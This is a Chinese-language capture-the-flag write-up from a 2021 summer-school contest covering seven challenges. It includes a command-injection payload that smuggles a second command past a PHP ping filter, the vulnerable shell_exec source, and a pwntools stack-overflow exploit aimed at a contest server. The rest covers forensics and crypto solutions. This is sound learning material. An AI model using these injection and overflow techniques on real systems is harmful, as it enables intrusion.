# 2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp

<div class="has-toc have-toc">
</div>

## 0x00 ping

很明显的命令执行，输入url/?ip=`127.0.0.1|ls`，可以观察到存在可以的文件。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-226.png" alt="" class="wp-image-3246" width="266" height="160" /> </figure> 

空格和flag无法传入，这里先绕过空格读一下源码

```php
<?php
	if(isset($_GET['ip'])){
		$ip = $_GET['ip'];
		if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
			print_r($match);
			print($ip);
			echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			die("ban symbol!");
		}
		else if(preg_match("/ /", $ip)){
			die("ban space!");
		}
		else if(preg_match("/bash/", $ip)){
			die("ban bash!");
		}
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
			die("ban flag!");
		}
		$a = shell_exec("ping -c 4 ".$ip);
		echo "<pre>";
		print_r($a);
	}

	?>
```

构造变量a来替代g，输入`127.0.0.1;a=g;cat$IFS$1fla$a.php`，拿到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="554" height="351" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-227.png" alt="" class="wp-image-3248" /> </figure> 

## 0x01 hidehight

用010editor打开发现有压缩包，上binwalk，然后foremost分离<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-228.png" alt="" class="wp-image-3250" width="753" height="208" /> </figure> 

拿出压缩包后，使用工具爆破。<figure class="wp-block-image size-full">

<img loading="lazy" width="554" height="281" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-229.png" alt="" class="wp-image-3251" /> </figure> 

成功解开压缩包，用010editor发现flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="554" height="195" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-230.png" alt="" class="wp-image-3252" /> </figure> 

## 0x02 easyusb

先过滤出来usb.capdata != 00:00:00:00:00:00:00:00，怀疑这是键盘键入的值。<figure class="wp-block-image size-full">

<img loading="lazy" width="554" height="208" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-231.png" alt="" class="wp-image-3254" /> </figure> 

提取一下s1=['s','S'],s2=['e','E'],s3=['c','C'],s4=['2','@'],s5=['e','E'],s6=['t','T'],s7=['k','K'],s8=['3','#'],s9=['y','Y']。在线生成一个字典。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-232.png" alt="" class="wp-image-3255" width="745" height="361" /> </figure> 

爆破，得到正确的密码。<figure class="wp-block-image size-full">

<img loading="lazy" width="440" height="193" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-233.png" alt="" class="wp-image-3256" /> </figure> 

解压文件。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-234.png" alt="" class="wp-image-3257" width="488" height="106" /> </figure> 

## 0x03 置换密码

题目给出了加密的过程，反着写解密的过程。

<pre class="wp-block-code"><code>text = 'ilhstlneoTR{N5A05PT11NC0PH1R}3'

key = &#91;3,1,2]

li0 = &#91;]
li1 = &#91;]
li2 = &#91;]
for i in range(0,len(text)):
    if i % 3 == 0:
        li2.append(text&#91;i])
    elif (i - 1) % 3 == 0:
        li0.append(text&#91;i])
    elif (i - 2) % 3 == 0:
        li1.append(text&#91;i])
li = &#91;]
for i in range(len(li1)):
    li.append(li1&#91;i])
    li.append(li2&#91;i])
    li.append(li0&#91;i])

print("The ciphered text is :")
ciphered_txt = (''.join(li))
print(ciphered_txt)</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="475" height="110" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-235.png" alt="" class="wp-image-3259" /> </figure> 

## 0x04 Easystack

题目明示栈溢出<figure class="wp-block-image size-full">

<img loading="lazy" width="538" height="134" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-238.png" alt="" class="wp-image-3264" /></figure> 

下面贴出官方给的代码，当时比赛时太紧张地址掉了0x，直接白给。。。

<pre class="wp-block-code"><code>from pwn import * 
context(os="linux",arch="amd64",log_level="debug") 
p = remote("81.70.89.91",57001) 
addr = 0x0000000000400729 
payload = b"A"*104+p64(addr) 
p.sendline(payload) 
p.interactive() </code></pre>

## 0x05 神奇的网站

这题没做出来，赛后复现一下。

追踪流，在tcp.stream eq 3时发现一个可疑的压缩包。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-239.png" alt="" class="wp-image-3268" width="605" height="154" /> </figure> 

过滤出来<figure class="wp-block-image size-full">

<img loading="lazy" width="733" height="43" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-240.png" alt="" class="wp-image-3271" /> </figure> 

导出分组字节流<figure class="wp-block-image size-full">

<img loading="lazy" width="914" height="503" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-241.png" alt="" class="wp-image-3272" /> </figure> 

解压出来一个flag文件<figure class="wp-block-image size-full">

<img loading="lazy" width="464" height="207" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-242.png" alt="" class="wp-image-3274" /> </figure> 

16进制打开看一哈，发现文件结尾是KP，结合TENET想到倒放，但不会操作。<figure class="wp-block-image size-full">

<img loading="lazy" width="680" height="252" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-243.png" alt="" class="wp-image-3277" /> </figure> 

看一下图片，感觉不太正常，丢到pngcheck里面过一遍，chunk块儿有问题。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-245.png" alt="" class="wp-image-3280" width="568" height="240" /> </figure> 

这里用官方给的一个脚本。

<pre class="wp-block-code"><code>&lt;?php  
$a = file_get_contents('flag'); 
file_put_contents("flag.zip",strrev($a));?&gt; </code></pre>

得到压缩包，可以看到有wav的音频文件，需要解个密。<figure class="wp-block-image size-full">

<img loading="lazy" width="101" height="56" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-244.png" alt="" class="wp-image-3278" /> </figure> 

图片的宽度异常，只有0001<figure class="wp-block-image size-full">

<img loading="lazy" width="729" height="59" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-251.png" alt="" class="wp-image-3290" /> </figure> 

这里随便改大就好<figure class="wp-block-image size-full">

<img loading="lazy" width="735" height="47" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-253.png" alt="" class="wp-image-3292" /> </figure> 

然后会惊奇地发现！<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-250.png" alt="" class="wp-image-3289" width="319" height="285" /> </figure> 

解压后是一段音频，听着太鬼畜了。。。，感觉也是倒放。移动到audacity，效果选择反向，可以了，是碳基生物的音乐了。然后使用网易云识别。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-246.png" alt="" class="wp-image-3285" width="239" height="411" /> </figure> 

原理上最后应该是<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-247.png" alt="" class="wp-image-3286" width="323" height="187" /> </figure> 

复现的时候已经没了，不过偶然发现了另一个flag，hhh<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-248.png" alt="" class="wp-image-3287" width="282" height="213" /> </figure> 

## 0x06 Java_app

这题也没做出来，复现下，先拖到雷电模拟器里面瞅瞅。是一个登录页面，随便试了试，感觉没什么有用信息。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-254.png" alt="" class="wp-image-3296" width="664" height="373" /> </figure> 

把apk放到jeb里面反汇编，头一次用这个软件，不得不说，确实牛批。找到MainActivity，点击查看，可以发现是smali写的，按下Tab键，转成java代码。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-255.png" alt="" class="wp-image-3298" width="649" height="647" /> </figure> 

发现一行关键代码，是匹配用户名密码是否正确的，可以看出用户名是`sllenc3`。

```
if((MainActivity.this.et_username.getText().toString().equals("s1lenc3")) && (MainActivity.this.c.b(MainActivity.this.et_password.getText().toString()).equals("yGlszHNUzWZl2UIU0W8WNFdSMXBsNGNl/V5hwmRlI6FTyD5u0UgRL+FZ+/U")))
```

而密码则经过了check函数的校验，与后面那串字符串匹配。<figure class="wp-block-image size-full">

<img loading="lazy" width="1504" height="717" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-256.png" alt="" class="wp-image-3303" /> </figure> 

后面的字符串包含[A-Za-z0-9+/]，应该和base64有关，据说是逆向中会常常碰到的base64换表加密，找一下加密后的base64表。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-258.png" alt="" class="wp-image-3310" width="623" height="117" /> </figure> 

用python脚本跑一下，注意加密的str1要补全padding

<pre class="wp-block-code"><code>import base64
import string

#要解密的代码
str1 = "yGlszHNUzWZl2UIU0W8WNFdSMXBsNGNl/V5hwmRlI6FTyD5u0UgRL+FZ+/U="
#改过之后的base64表
string1 = "ABCDEFGHIJKLMNOP456789+/wxyz0123ghijklmnopqrstuvQRSTUVWXYZabcdef"
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</code></pre>

出来结果<figure class="wp-block-image size-full">

<img loading="lazy" width="1094" height="392" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-257.png" alt="" class="wp-image-3305" /> </figure> 

## 0x07 总结

菜是原罪，好几题有思路但做不出来QAQ，基本功不扎实，还要多学多练。感谢室友们，头一次组队打CTF，团队配合得非常nice，虽然都被dalao们按着锤了，但是没有关系，挺开心的，也蛮累的，不错的体验。
